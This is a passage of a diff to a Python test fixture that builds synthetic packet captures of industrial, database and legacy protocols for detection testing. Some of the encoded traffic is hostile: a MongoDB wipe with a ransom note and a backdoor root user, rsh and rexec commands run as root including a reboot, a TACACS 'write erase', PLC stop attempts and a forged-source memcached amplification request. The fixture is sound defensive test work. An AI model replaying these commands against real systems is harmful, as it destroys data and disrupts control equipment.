@@ -8,7 +8,9 @@ Built with struct like tests/pcap_fixtures.py, deterministic, so the
 expected values never drift. Keep it deterministic: changing a single byte
 here means re-running Suricata over it to refresh those expectations.
 """
+import json
 import socket
+import functools
 import struct
 
 from tests.pcap_fixtures import _checksum, _tcp_packet, tcp_segments, write_pcap
@@ -692,6 +694,91 @@ def write_opcua_pcap(path):
     write_pcap(path, opcua_packets())
 
 
+# ---------------------------------------------------------------- MMS
+#
+# A SCADA client (CLIENT:49152) and a relay (MMS_SERVER:102). The OSI
+# connection (COTP connect, session connect carrying the presentation and
+# ACSE association with MMS initiate, and its accept) is a real ICCP
+# client's and server's, from ITI's IEC 61850 samples - tshark decodes MMS
+# only after seeing which presentation context carries it. Then: a read of
+# IED1LD0/LLN0$ST$Mod$stVal (1), Identify (Fixture Vendor, Fixture Relay,
+# 1.2), a write to XCBR1$CO$Pos$Oper (an operate, success), a write to
+# XCBR1$CO$Pos$SBOw (a select, refused object-access-denied), a stop of
+# program Fixture_App refused (vmd-state: 2), an information report, and
+# conclude.
+
+MMS_SERVER = '10.1.0.102'
+
+
+def _ber_tlv(tag, value):
+    """BER: a tag (one byte, or bytes for a high tag number) and length."""
+    n = len(value)
+    length = bytes([n]) if n < 128 else bytes([0x80 | ((n.bit_length() + 7) // 8)]) + n.to_bytes((n.bit_length() + 7) // 8, 'big')
+    return (tag if isinstance(tag, bytes) else bytes([tag])) + length + value
+
+
+def _mms_tpkt(mms):
+    """An MMS PDU in a COTP data TPDU, session give-tokens and data SPDUs,
+    and presentation user data (context 3, MMS)."""
+    pdv = _ber_tlv(0x61, _ber_tlv(0x30, b'\x02\x01\x03' + _ber_tlv(0xa0, mms)))
+    payload = b'\x02\xf0\x80' + b'\x01\x00\x01\x00' + pdv
+    return struct.pack('!BBH', 3, 0, 4 + len(payload)) + payload
+
+
+def _mms_name(domain, item):
+    return _ber_tlv(0xa1, _ber_tlv(0x1a, domain.encode()) + _ber_tlv(0x1a, item.encode()))
+
+
+def _mms_variable(domain, item):
+    return _ber_tlv(0xa0, _ber_tlv(0x30, _ber_tlv(0xa0, _mms_name(domain, item))))
+
+
+def _mms_request(invoke, service):
+    return _ber_tlv(0xa0, b'\x02\x01' + bytes([invoke]) + service)
+
+
+def _mms_response(invoke, service):
+    return _ber_tlv(0xa1, b'\x02\x01' + bytes([invoke]) + service)
+
+
+def mms_packets():
+    cr = bytes.fromhex('0300001611e00000b00100c0010ac1020001c2020002')
+    cc = bytes.fromhex('0300000e09d0b001180200c0010a')
+    associate = bytes.fromhex(
+        '030000c502f0800dbc0506130100160102140200023302000134020002c1a63181a3a003800101a2819b800207808104000000018204'
+        '00000002a423300f0201010604520100013004060251013010020103060528ca220201300406025101880206006160305e020101a059'
+        '605780020780a107060528ca220101a20406022902a303020102a60406022901a703020101be32283006025101020103a027a8258002'
+        '7d00810114820114830104a416800101810305fb00820c036e1d000000000064000198')
+    accept = bytes.fromhex(
+        '0300009e02f0800e95050613010016010214020002c187318184a003800101a27d80020780830400000002a512300780010081025101'
+        '300780010081025101615d305b020101a056615480020780a107060528ca220101a203020100a305a103020100a40406022902a50302'
+        '0102be2e282c020103a027a92580027d00810114820114830104a416800101810305fb00820c036e1d000000000064000198')
+    read = _mms_request(1, _ber_tlv(0xa4, _ber_tlv(0xa1, _mms_variable('IED1LD0', 'LLN0$ST$Mod$stVal'))))
+    read_response = _mms_response(1, _ber_tlv(0xa4, _ber_tlv(0xa1, b'\x85\x01\x01')))
+    identify = _mms_request(2, b'\x82\x00')
+    identify_response = _mms_response(2, _ber_tlv(0xa2, _ber_tlv(0x80, b'Fixture Vendor') + _ber_tlv(0x81, b'Fixture Relay')
+                                                  + _ber_tlv(0x82, b'1.2')))
+    operate_value = _ber_tlv(0xa0, _ber_tlv(0xa2, b'\x83\x01\xff' + b'\x85\x01\x00'))
+    operate = _mms_request(3, _ber_tlv(0xa5, _mms_variable('IED1LD0', 'XCBR1$CO$Pos$Oper') + operate_value))
+    operate_response = _mms_response(3, _ber_tlv(0xa5, b'\x81\x00'))
+    select = _mms_request(4, _ber_tlv(0xa5, _mms_variable('IED1LD0', 'XCBR1$CO$Pos$SBOw') + operate_value))
+    select_response = _mms_response(4, _ber_tlv(0xa5, b'\x80\x01\x03'))
+    stop = _mms_request(5, _ber_tlv(b'\xbf\x29', _ber_tlv(0x80, b'Fixture_App')))
+    stop_error = _ber_tlv(0xa2, b'\x80\x01\x05' + _ber_tlv(0xa2, _ber_tlv(0xa0, b'\x80\x01\x02')))
+    report = _ber_tlv(0xa3, _ber_tlv(0xa0, _ber_tlv(0xa1, _mms_name('IED1LD0', 'LLN0$dsTrips'))
+                                     + _ber_tlv(0xa0, b'\x85\x01\x07')))
+    segments = [(True, cr), (False, cc), (True, associate), (False, accept)] + [
+        (client, _mms_tpkt(pdu)) for client, pdu in (
+            (True, read), (False, read_response), (True, identify), (False, identify_response),
+            (True, operate), (False, operate_response), (True, select), (False, select_response),
+            (True, stop), (False, stop_error), (False, report), (True, b'\x8b\x00'), (False, b'\x8c\x00'))]
+    return tcp_segments(CLIENT, MMS_SERVER, 49152, 102, segments)
+
+
+def write_mms_pcap(path):
+    write_pcap(path, mms_packets())
+
+
 # ---------------------------------------------------------------- GOOSE
 #
 # One relay (GOOSE_PUBLISHER) publishing control block LD0/LLN0$GO$gcb1:
@@ -725,6 +812,899 @@ def goose_packets():
 
 def write_goose_pcap(path):
     write_pcap(path, goose_packets())
+
+
+# ---------------------------------------------------------------- MongoDB
+#
+# An open MongoDB server (MONGO_SERVER:27017). One client (CLIENT:50000,
+# PyMongo) says isMaster by OP_QUERY, then by OP_MSG asks the version
+# (6.0.5), lists the databases (admin, shop), drops shop, and inserts a
+# ransom note into READ_ME_TO_RECOVER_YOUR_DATA.README - all answered ok,
+# with no login. Another (CLIENT:50001) tries SCRAM-SHA-256 as alice
+# (refused), then createUser backdoor with role root (refused, unauthorized).
+
+MONGO_SERVER = '10.1.0.27'
+
+
+def _bson(*elements):
+    body = b''
+    for name, value in elements:
+        key = name.encode() + b'\x00'
+        if isinstance(value, bool):
+            body += b'\x08' + key + (b'\x01' if value else b'\x00')
+        elif isinstance(value, int):
+            body += b'\x10' + key + struct.pack('<i', value)
+        elif isinstance(value, float):
+            body += b'\x01' + key + struct.pack('<d', value)
+        elif isinstance(value, str):
+            data = value.encode() + b'\x00'
+            body += b'\x02' + key + struct.pack('<i', len(data)) + data
+        elif isinstance(value, bytes):
+            body += b'\x05' + key + struct.pack('<iB', len(value), 0) + value
+        elif isinstance(value, list):
+            body += b'\x04' + key + _bson(*[(str(i), v) for i, v in enumerate(value)])
+        else:                          # a subdocument, as a tuple of pairs
+            body += b'\x03' + key + _bson(*value)
+    return struct.pack('<i', 4 + len(body) + 1) + body + b'\x00'
+
+
+def _mongo_message(opcode, request_id, response_to, payload):
+    return struct.pack('<iiii', 16 + len(payload), request_id, response_to, opcode) + payload
+
+
+def _mongo_query(request_id, namespace, doc):
+    return _mongo_message(2004, request_id, 0, struct.pack('<i', 0) + namespace.encode() + b'\x00'
+                          + struct.pack('<ii', 0, -1) + doc)
+
+
+def _mongo_reply(request_id, doc):
+    return _mongo_message(1, 1000 + request_id, request_id, struct.pack('<iqii', 0, 0, 0, 1) + doc)
+
+
+def _mongo_msg(request_id, response_to, doc, sequence=None):
+    sections = b'\x00' + doc
+    if sequence:
+        identifier, docs = sequence
+        data = identifier.encode() + b'\x00' + b''.join(docs)
+        sections += b'\x01' + struct.pack('<i', 4 + len(data)) + data
+    return _mongo_message(2013, request_id, response_to, struct.pack('<I', 0) + sections)
+
+
+def mongodb_packets():
+    ok = ('ok', 1.0)
+    client = (('driver', (('name', 'PyMongo'), ('version', '4.6.3'))),
+              ('os', (('type', 'Linux'), ('name', 'Linux'), ('version', '6.1.0'))), ('platform', 'CPython 3.11.2'))
+    note = _bson(('content', 'All your data is backed up. Send 0.01 BTC to 1AbcFixture to recover it.'),
+                 ('email', 'recover@example.net'))
+    attacker = [
+        (True, _mongo_query(1, 'admin.$cmd', _bson(('isMaster', 1), ('client', client)))),
+        (False, _mongo_reply(1, _bson(('ismaster', True), ('maxWireVersion', 17), ok))),
+        (True, _mongo_msg(2, 0, _bson(('buildInfo', 1), ('$db', 'admin')))),
+        (False, _mongo_msg(1002, 2, _bson(('version', '6.0.5'), ok))),
+        (True, _mongo_msg(3, 0, _bson(('listDatabases', 1), ('$db', 'admin')))),
+        (False, _mongo_msg(1003, 3, _bson(('databases', [(('name', 'admin'), ('sizeOnDisk', 40960)),
+                                                          (('name', 'shop'), ('sizeOnDisk', 81920))]), ok))),
+        (True, _mongo_msg(4, 0, _bson(('dropDatabase', 1), ('$db', 'shop')))),
+        (False, _mongo_msg(1004, 4, _bson(('dropped', 'shop'), ok))),
+        (True, _mongo_msg(5, 0, _bson(('insert', 'README'), ('$db', 'READ_ME_TO_RECOVER_YOUR_DATA')),
+                          sequence=('documents', [note]))),
+        (False, _mongo_msg(1005, 5, _bson(('n', 1), ok))),
+    ]
+    refused = ('ok', 0.0)
+    login = [
+        (True, _mongo_msg(6, 0, _bson(('saslStart', 1), ('mechanism', 'SCRAM-SHA-256'),
+                                      ('payload', b'n,,n=alice,r=fixturenonce'), ('$db', 'admin')))),
+        (False, _mongo_msg(1006, 6, _bson(('conversationId', 1), ('done', False), ('payload', b'r=fixturenonce1,s=c2FsdA==,i=15000'), ok))),
+        (True, _mongo_msg(7, 0, _bson(('saslContinue', 1), ('conversationId', 1), ('payload', b'c=biws,r=fixturenonce1,p=proof'),
+                                      ('$db', 'admin')))),
+        (False, _mongo_msg(1007, 7, _bson(refused, ('errmsg', 'Authentication failed.'), ('code', 18),
+                                          ('codeName', 'AuthenticationFailed')))),
+        (True, _mongo_msg(8, 0, _bson(('createUser', 'backdoor'), ('pwd', 'hunter2'),
+                                      ('roles', [(('role', 'root'), ('db', 'admin'))]), ('$db', 'admin')))),
+        (False, _mongo_msg(1008, 8, _bson(refused, ('errmsg', 'command createUser requires authentication'), ('code', 13),
+                                          ('codeName', 'Unauthorized')))),
+    ]
+    return (tcp_segments(CLIENT, MONGO_SERVER, 50000, 27017, attacker)
+            + tcp_segments(CLIENT, MONGO_SERVER, 50001, 27017, login))
+
+
+def write_mongodb_pcap(path):
+    write_pcap(path, mongodb_packets())
+
+
+# ---------------------------------------------------------------- rsh, rlogin, rexec
+#
+# One host (RSH_SERVER) running all three. alice runs `id; uname -a` as
+# root over rsh (accepted, with its output); operator's rexec of a reboot
+# is refused (Login incorrect); bob logs in over rlogin, types his password
+# at the prompt, then ls and exit; and a scanner sends rsh an HTTP request,
+# which it answers with an error.
+
+RSH_SERVER = '10.1.0.51'
+
+
+def rsh_packets():
+    rsh = [(True, b'0\x00alice\x00root\x00id; uname -a\x00'), (False, b'\x00'),
+           (False, b'uid=0(root) gid=0(root) groups=0(root)\nLinux plc 5.10.0\n')]
+    rexec = [(True, b'0\x00operator\x00s3cret\x00shutdown -r now\x00'), (False, b'\x01Login incorrect.\n')]
+    rlogin = [(True, b'\x00bob\x00bob\x00xterm/38400\x00'), (False, b'\x00'), (False, b'Password: '),
+              (True, b'hunter2\r'), (False, b'\r\nLast login: Mon Nov  2 09:00\r\n$ '), (True, b'ls\r'),
+              (False, b'ls\r\nnotes.txt\r\n$ '), (True, b'exit\r')]
+    probe = [(True, b'GET / HTTP/1.0\r\n\r\n'), (False, b'\x01Can not make pipe\n')]
+    return (tcp_segments(CLIENT, RSH_SERVER, 1022, 514, rsh) + tcp_segments(CLIENT, RSH_SERVER, 1023, 512, rexec)
+            + tcp_segments(CLIENT, RSH_SERVER, 1021, 513, rlogin) + tcp_segments(CLIENT, RSH_SERVER, 40000, 514, probe))
+
+
+def write_rsh_pcap(path):
+    write_pcap(path, rsh_packets())
+
+
+# ---------------------------------------------------------------- Omron FINS
+#
+# FINS_STATION (node 10) and FINS_PLC (node 1), over UDP 9600: a Controller
+# Data Read (a CJ2M-CPU31, version 02.01), a DM read, a DM write, a switch
+# to MONITOR mode, a Stop the PLC refuses, and a Program Area Protect
+# Clear with the wrong password. Over FINS/TCP, CLIENT:41900 exchanges
+# node addresses and forces a CIO word. FINS_SCANNER's Controller Data
+# Read (source node 99, as internet scanners send it) gets no answer.
+
+FINS_STATION, FINS_PLC, FINS_SCANNER = '10.1.0.83', '10.1.0.84', '10.1.0.85'
+
+
+def _fins(command, sid, data=b'', response=None, dst=1, src=10):
+    if response is None:
+        header = bytes([0x80, 0, 2, 0, dst, 0, 0, src, 0, sid])
+        return header + struct.pack('!H', command) + data
+    return bytes([0xc0, 0, 2, 0, src, 0, 0, dst, 0, sid]) + struct.pack('!HH', command, response) + data
+
+
+def _fins_tcp(command, data):
+    return b'FINS' + struct.pack('!III', 8 + len(data), command, 0) + data
+
+
+def fins_packets():
+    model = b'CJ2M-CPU31'.ljust(20) + b'02.01'.ljust(20) + b'\x00' * 40 + bytes(12)
+    udp = [(_fins(0x0501, 1), _fins(0x0501, 1, model, 0)),
+           (_fins(0x0101, 2, b'\x82\x00\x64\x00\x00\x02'), _fins(0x0101, 2, b'\x12\x34\x56\x78', 0)),
+           (_fins(0x0102, 3, b'\x82\x00\x64\x00\x00\x02\xff\xff\x00\x01'), _fins(0x0102, 3, b'', 0)),
+           (_fins(0x0401, 4, b'\xff\xff\x02'), _fins(0x0401, 4, b'', 0)),
+           (_fins(0x0402, 5, b'\xff\xff'), _fins(0x0402, 5, b'', 0x2201)),
+           (_fins(0x0305, 6, b'\xff\xff\x00\x00\x00\x00\x00\xff\xff\xff\xff' + b'1234'), _fins(0x0305, 6, b'', 0x2602))]
+    packets = []
+    for request, reply in udp:
+        packets += [_udp_packet(FINS_STATION, FINS_PLC, 9600, 9600, request), _udp_packet(FINS_PLC, FINS_STATION, 9600, 9600, reply)]
+    packets.append(_udp_packet(FINS_SCANNER, FINS_PLC, 41950, 9600, _fins(0x0501, 0, src=99, dst=0)))
+    tcp = [(True, _fins_tcp(0, b'\x00\x00\x00\x00')), (False, _fins_tcp(1, b'\x00\x00\x00\x0b\x00\x00\x00\x01')),
+           (True, _fins_tcp(2, _fins(0x2301, 7, b'\x00\x01\x00\x01\xb0\x00\x0a\x00', src=11))),
+           (False, _fins_tcp(2, _fins(0x2301, 7, b'', 0, src=11)))]
+    return packets + tcp_segments(CLIENT, FINS_PLC, 41900, 9600, tcp)
+
+
+def write_fins_pcap(path):
+    write_pcap(path, fins_packets())
+
+
+# ---------------------------------------------------------------- HART-IP
+#
+# HART_HOST:41960 opens a TCP session with HART_GATEWAY as a primary
+# master and asks its device for its identity (by polling address 0: a
+# Rosemount-made type 0x264e, ID 0000d2), its tag (PT-101) and its PV;
+# writes its tag (to PT-1O1), puts its loop current at a fixed 20 mA and
+# asks for a device reset, which the device refuses (access restricted).
+# HART_SCANNER's UDP Session Initiate gets no answer, nor does a scanner's
+# text template that tshark takes for HART-IP.
+
+HART_HOST, HART_GATEWAY, HART_SCANNER = '10.1.0.86', '10.1.0.87', '10.1.0.88'
+_HART_LONG = bytes.fromhex('a64e0000d2')        # (the primary master bit set)
+
+
+def _hart_ip(kind, message, seq, body=b'', status=0):
+    return struct.pack('!BBBBHH', 1, kind, message, status, seq, 8 + len(body)) + body
+
+
+def _hart_frame(delimiter, address, command, data):
+    frame = bytes([delimiter]) + address + bytes([command, len(data)]) + data
+    return frame + bytes([functools.reduce(lambda a, b: a ^ b, frame)])
+
+
+def _hart_packed(text, length):
+    bits = ''.join(format(ord(c) & 0x3f, '06b') for c in text.ljust(length * 4 // 3))
+    return int(bits, 2).to_bytes(length, 'big')
+
+
+def hart_ip_packets():
+    identity = (b'\xfe\x26\x4e\x05\x07\x04\x01\x0e\x0c\x00\x00\xd2\x05\x02\x00\x02\xd0\x00\x26\x00\x26\x84')
+    request = lambda seq, command, data=b'', short=False: _hart_ip(0, 3, seq, _hart_frame(
+        0x02 if short else 0x82, b'\x80' if short else _HART_LONG, command, data))
+    reply = lambda seq, command, data=b'', code=0, short=False: _hart_ip(1, 3, seq, _hart_frame(
+        0x06 if short else 0x86, b'\x80' if short else _HART_LONG, command, bytes([code, 0]) + data))
+    tag = _hart_packed('PT-101', 6) + _hart_packed('PRESSURE', 12) + b'\x01\x0b\x7e'
+    session = [(True, _hart_ip(0, 0, 1, b'\x01\x00\x00\xea\x60')), (False, _hart_ip(1, 0, 1, b'\x01\x00\x00\xea\x60')),
+               (True, request(2, 0, short=True)), (False, reply(2, 0, identity, short=True)),
+               (True, request(3, 13)), (False, reply(3, 13, tag)),
+               (True, request(4, 1)), (False, reply(4, 1, b'\x0c' + struct.pack('!f', 4.25))),
+               (True, request(5, 18, _hart_packed('PT-1O1', 6) + _hart_packed('PRESSURE', 12) + b'\x01\x0b\x7e')),
+               (False, reply(5, 18, _hart_packed('PT-1O1', 6) + _hart_packed('PRESSURE', 12) + b'\x01\x0b\x7e')),
+               (True, request(6, 40, struct.pack('!f', 20.0))), (False, reply(6, 40, struct.pack('!f', 20.0))),
+               (True, request(7, 42)), (False, reply(7, 42, code=16)),
+               (True, _hart_ip(0, 1, 8)), (False, _hart_ip(1, 1, 8))]
+    return (tcp_segments(HART_HOST, HART_GATEWAY, 41960, 5094, session)
+            + [_udp_packet(HART_SCANNER, HART_GATEWAY, 41970, 5094, _hart_ip(0, 0, 1, b'\x01\x00\x00\xea\x60')),
+               _udp_packet(HART_SCANNER, HART_GATEWAY, 23318, 5094,
+                           bytes.fromhex('7b01001631333931313131313131327b7b2e69707d7d7b7b2e706f72747d7d7b'))])
+
+
+def write_hart_ip_pcap(path):
+    write_pcap(path, hart_ip_packets())
+
+
+# ---------------------------------------------------------------- EtherCAT
+#
+# An EtherCAT master (ECAT_MASTER) on its segment, each frame captured
+# going out and coming back (the source MAC's locally administered bit
+# set, the working counters counted up by the slaves): a broadcast read of
+# AL Status that three slaves answer, the slaves sent to INIT, slave
+# 0x1001's EEPROM written, a firmware file sent to it over FoE, and the
+# slaves sent to OP. ECAT_SCANNER's broadcast read over UDP 34980 - as
+# internet scanners send it - gets no answer.
+
+ECAT_MASTER, ECAT_SCANNER = '00:14:4f:23:98:cf', '10.1.0.99'
+
+
+def _ecat_datagram(command, adp, ado, data, wkc=0, more=False):
+    return struct.pack('<BBHHHH', command, 0, adp, ado, len(data) | (0x8000 if more else 0), 0) + data + struct.pack('<H', wkc)
+
+
+def _ecat_frame(datagrams, back=False):
+    payload = b''.join(datagrams)
+    src = bytes.fromhex(ECAT_MASTER.replace(':', ''))
+    if back:
+        src = bytes([src[0] | 0x02]) + src[1:]
+    frame = b'\xff' * 6 + src + b'\x88\xa4' + struct.pack('<H', len(payload) | 0x1000) + payload
+    return frame + b'\x00' * max(0, 60 - len(frame))
+
+
+def ecat_packets():
+    foe = b'\x02\x00' + struct.pack('<I', 0) + b'firmware.efw'
+    mailbox = struct.pack('<HHBB', len(foe), 0, 0, 0x14) + foe
+    # (command, slave, register, data, the working counter back: every slave, or the one addressed)
+    steps = [(7, 0, 0x0130, b'\x00\x00', 3), (8, 0, 0x0120, b'\x11\x00', 3),
+             (5, 0x1001, 0x0502, b'\x01\x02\x00\x00\x10\x00', 1), (5, 0x1001, 0x1000, mailbox, 1),
+             (8, 0, 0x0120, b'\x08\x00', 3)]
+    frames = []
+    for command, slave, register, data, wkc in steps:
+        frames += [_ecat_frame([_ecat_datagram(command, slave, register, data)]),
+                   _ecat_frame([_ecat_datagram(command, slave, register, data, wkc)], back=True)]
+    probe = b'\x0e\x10' + _ecat_datagram(7, 0, 0x0130, b'\x00\x00') + b'\x00' * 30
+    return frames + [_udp_packet(ECAT_SCANNER, '10.1.0.100', 34980, 34980, probe)]
+
+
+def write_ecat_pcap(path):
+    write_pcap(path, ecat_packets())
+
+
+# ---------------------------------------------------------------- C37.118
+#
+# Shaped on pyPMU's PMU and PDC talking: a PDC (CLIENT:42200) asks
+# SYNPHASOR_PMU (stream 1410, station "Substation B PMU", ID 7734: three
+# voltage phasors, an analog, 16 breaker statuses, 60 Hz, 30 frames a
+# second) for its header and configuration, turns its data on - five
+# frames, one saying the PMU lost GPS time sync, one a trigger - and off.
+
+SYNPHASOR_PMU = '10.1.0.98'
+
+
+def _c37_crc(data):
+    crc = 0xffff
+    for byte in data:
+        crc ^= byte << 8
+        for _ in range(8):
+            crc = (crc << 1) ^ 0x1021 if crc & 0x8000 else crc << 1
+            crc &= 0xffff
+    return crc
+
+
+def _c37(kind, body, stream=1410, soc=1700000000, fracsec=0):
+    frame = struct.pack('!HHHII', 0xaa01 | kind << 4, 14 + len(body) + 2, stream, soc, fracsec) + body
+    return frame + struct.pack('!H', _c37_crc(frame))
+
+
+def synphasor_packets():
+    name = lambda text: text.encode().ljust(16)[:16]
+    labels = ['VA', 'VB', 'VC', 'ANALOG1'] + [f'BREAKER {i} STATUS' for i in range(1, 17)]
+    config = (struct.pack('!IH', 1000000, 1) + name('Substation B PMU') + struct.pack('!HHHHH', 7734, 0x0004, 3, 1, 1)
+              + b''.join(name(n) for n in labels) + struct.pack('!III', 915527, 915527, 915527) + struct.pack('!I', 0x01000001)
+              + struct.pack('!HH', 0x0000, 0xffff) + struct.pack('!HH', 0, 1) + struct.pack('!h', 30))
+    data = lambda stat, n: _c37(0, struct.pack('!H', stat) + struct.pack('!hhhhhh', 14635, 0, -7318, -12676, -7318, 12675)
+                                + struct.pack('!hh', 2500, 0) + struct.pack('!f', 9.91) + struct.pack('!H', 1), fracsec=n * 33333)
+    command = lambda code: _c37(4, struct.pack('!H', code))
+    exchange = [(True, command(3)), (False, _c37(1, b'Hello I am a PMU at Substation B')),
+                (True, command(5)), (False, _c37(3, config)), (True, command(2))]
+    exchange += [(False, data(stat, n)) for n, stat in enumerate((0, 0, 0x2000, 0x0800, 0))]
+    exchange.append((True, command(1)))
+    return tcp_segments(CLIENT, SYNPHASOR_PMU, 42200, 4712, exchange)
+
+
+def write_synphasor_pcap(path):
+    write_pcap(path, synphasor_packets())
+
+
+# ---------------------------------------------------------------- TACACS+
+#
+# A router (TACACS_NAS) asks TACACS_SERVER over one unencrypted connection
+# (port 49, single-connection): an ASCII login by admin on vty0 from
+# 10.9.9.9 - username and password asked for and given, passed - then
+# authorization for "show running-config" (passed) and "write erase"
+# (failed), and accounting of the session's start. A second login, by
+# guest with PAP, fails. Another router (TACACS_NAS2) talks to the server
+# encrypted, as it should: its login and authorization show only as
+# what they are.
+
+TACACS_SERVER, TACACS_NAS, TACACS_NAS2 = '10.1.0.95', '10.1.0.96', '10.1.0.97'
+
+
+def _tacacs(kind, seq, session, body, version=0xc0, flags=0x05):
+    return struct.pack('!BBBBII', version, kind, seq, flags, session, len(body)) + body
+
+
+def _tacacs_args(args):
+    return bytes([len(a) for a in args]), b''.join(a.encode() for a in args)
+
+
+def tacacs_packets():
+    login, author1, author2, acct, pap = 0x1001, 0x1002, 0x1003, 0x1004, 0x1005
+    start = struct.pack('!BBBBBBBB', 1, 1, 1, 1, 0, 4, 8, 0) + b'vty0' + b'10.9.9.9'
+    reply = lambda status, msg, flags=0: struct.pack('!BBHH', status, flags, len(msg), 0) + msg.encode()
+    cont = lambda text: struct.pack('!HHB', len(text), 0, 0) + text.encode()
+
+    def author(session, command, status, args_back=()):
+        args = ['service=shell', 'cmd=' + command.split()[0]] + ['cmd-arg=' + a for a in command.split()[1:]] + ['cmd-arg=<cr>']
+        lens, data = _tacacs_args(args)
+        request = struct.pack('!BBBBBBBB', 6, 15, 1, 1, 5, 4, 8, len(args)) + lens + b'admin' + b'vty0' + b'10.9.9.9' + data
+        blens, bdata = _tacacs_args(args_back)
+        answer = struct.pack('!BBHH', status, len(args_back), 0, 0) + blens + bdata
+        return [(True, _tacacs(2, 1, session, request)), (False, _tacacs(2, 2, session, answer))]
+
+    lens, data = _tacacs_args(['task_id=17', 'start_time=1700000000', 'service=shell'])
+    accounting = struct.pack('!BBBBBBBBB', 0x02, 6, 15, 1, 1, 5, 4, 8, 3) + lens + b'admin' + b'vty0' + b'10.9.9.9' + data
+    pap_start = struct.pack('!BBBBBBBB', 1, 1, 2, 1, 5, 4, 8, 7) + b'guest' + b'vty1' + b'10.9.9.9' + b'letmein'
+    session = ([(True, _tacacs(1, 1, login, start)), (False, _tacacs(1, 2, login, reply(4, 'Username: '))),
+                (True, _tacacs(1, 3, login, cont('admin'))), (False, _tacacs(1, 4, login, reply(5, 'Password: ', 1))),
+                (True, _tacacs(1, 5, login, cont('Sup3rS3cret'))), (False, _tacacs(1, 6, login, reply(1, '')))]
+               + author(author1, 'show running-config', 1) + author(author2, 'write erase', 0x10)
+               + [(True, _tacacs(3, 1, acct, accounting)), (False, _tacacs(3, 2, acct, struct.pack('!HHB', 0, 0, 1)))]
+               + [(True, _tacacs(1, 1, pap, pap_start, version=0xc1)),
+                  (False, _tacacs(1, 2, pap, reply(2, 'Authentication failed'), version=0xc1))])
+    noise = bytes(range(40))
+    encrypted = [(True, _tacacs(1, 1, 0x2001, noise, flags=0x04)), (False, _tacacs(1, 2, 0x2001, noise[:16], flags=0x04)),
+                 (True, _tacacs(2, 1, 0x2002, noise, flags=0x04)), (False, _tacacs(2, 2, 0x2002, noise[:8], flags=0x04))]
+    return (tcp_segments(TACACS_NAS, TACACS_SERVER, 42100, 49, session)
+            + tcp_segments(TACACS_NAS2, TACACS_SERVER, 42101, 49, encrypted))
+
+
+def write_tacacs_pcap(path):
+    write_pcap(path, tacacs_packets())
+
+
+# ---------------------------------------------------------------- RakNet
+#
+# A Minecraft Bedrock client (CLIENT:41980) pings RAKNET_SERVER:19132,
+# whose pong advertises it (Lab Server, 1.21.20, 3 of 10 players), then
+# opens a connection (MTU 1464) and exchanges datagrams. RAKNET_SCANNER's
+# ping gets no answer, and RAKNET_NOISE sends random bytes to the port.
+
+RAKNET_SERVER, RAKNET_SCANNER, RAKNET_NOISE = '10.1.0.92', '10.1.0.93', '10.1.0.94'
+_RAKNET_MAGIC = bytes.fromhex('00ffff00fefefefefdfdfdfd12345678')
+RAKNET_ADVERTISEMENT = 'MCPE;Lab Server;712;1.21.20;3;10;13253860892328930865;Bedrock level;Survival;1;19132;19133;'
+
+
+def raknet_packets():
+    client_guid, server_guid = bytes.fromhex('1122334455667788'), bytes.fromhex('a1a2a3a4a5a6a7a8')
+    ad = RAKNET_ADVERTISEMENT.encode()
+    address = lambda ip, port: b'\x04' + bytes(255 - int(x) for x in ip.split('.')) + struct.pack('!H', port)
+    exchange = [
+        (True, b'\x01' + struct.pack('!Q', 1000) + _RAKNET_MAGIC + client_guid),
+        (False, b'\x1c' + struct.pack('!Q', 1000) + server_guid + _RAKNET_MAGIC + struct.pack('!H', len(ad)) + ad),
+        (True, b'\x05' + _RAKNET_MAGIC + b'\x0b' + b'\x00' * (1464 - 28 - 18)),
+        (False, b'\x06' + _RAKNET_MAGIC + server_guid + b'\x00' + struct.pack('!H', 1464)),
+        (True, b'\x07' + _RAKNET_MAGIC + address(RAKNET_SERVER, 19132) + struct.pack('!H', 1464) + client_guid),
+        (False, b'\x08' + _RAKNET_MAGIC + server_guid + address(CLIENT, 41980) + struct.pack('!H', 1464) + b'\x00'),
+        (True, b'\x84\x00\x00\x00\x40\x00\x90\x00\x00\x00\x09' + client_guid),
+        (False, b'\xc0\x00\x01\x01\x00\x00\x00'),
+        (False, b'\x84\x00\x00\x00\x40\x00\x90\x00\x00\x00\x10' + server_guid),
+        (True, b'\xc0\x00\x01\x01\x00\x00\x00')]
+    out = [(CLIENT, RAKNET_SERVER, 41980, 19132, p) if to_server else (RAKNET_SERVER, CLIENT, 19132, 41980, p)
+           for to_server, p in exchange]
+    out.append((RAKNET_SCANNER, RAKNET_SERVER, 41990, 19132, b'\x01' + struct.pack('!Q', 0) + _RAKNET_MAGIC + bytes(8)))
+    out.append((RAKNET_NOISE, RAKNET_SERVER, 58787, 19132, bytes.fromhex('1cdd94e7c286f93e25c4415a76e1a16dd1afc9ce37cb')))
+    return [_udp_packet(*p) for p in out]
+
+
+def write_raknet_pcap(path):
+    write_pcap(path, raknet_packets())
+
+
+# ---------------------------------------------------------------- memcached
+#
+# Shaped on a capture of memcached 1.6.38. CLIENT:41600 uses the text
+# protocol: version, a session stored, read and deleted, a counter, a
+# command memcached doesn't know, and flush_all. CLIENT:41601 stores a
+# 3000-byte value whose lines look like commands. CLIENT:41602 asks for
+# stats over TCP, CLIENT:41603 speaks the binary protocol. Over UDP,
+# MEMCACHE_VICTIM:41700 (a forged source, as an attack's would be) asks
+# for stats and gets three datagrams back; a scanner's stats items gets
+# nothing, another sends random bytes to the port, and one random-byte
+# packet comes from port 11211 itself.
+
+MEMCACHE_SERVER, MEMCACHE_VICTIM, MEMCACHE_SCANNER = '198.51.100.97', '10.1.0.81', '10.1.0.82'
+
+
+def _memcache_udp(request_id, seq, total, payload):
+    return struct.pack('!HHHH', request_id, seq, total, 0) + payload
+
+
+def _memcache_binary(magic, opcode, key=b'', extras=b'', value=b'', status=0, opaque=0):
+    return struct.pack('!BBHBBHIIQ', magic, opcode, len(key), len(extras), 0, status,
+                       len(key) + len(extras) + len(value), opaque, 0) + extras + key + value
+
+
+def memcache_packets():
+    text = [(True, b'version\r\n'), (False, b'VERSION 1.6.38\r\n'),
+            (True, b'set session:4711 0 3600 16\r\n{"user":"alice"}\r\n'), (False, b'STORED\r\n'),
+            (True, b'get session:4711\r\n'), (False, b'VALUE session:4711 0 16\r\n{"user":"alice"}\r\nEND\r\n'),
+            (True, b'incr hits 1\r\n'), (False, b'NOT_FOUND\r\n'), (True, b'add hits 0 0 1\r\n5\r\n'),
+            (False, b'STORED\r\n'), (True, b'incr hits 3\r\n'), (False, b'8\r\n'),
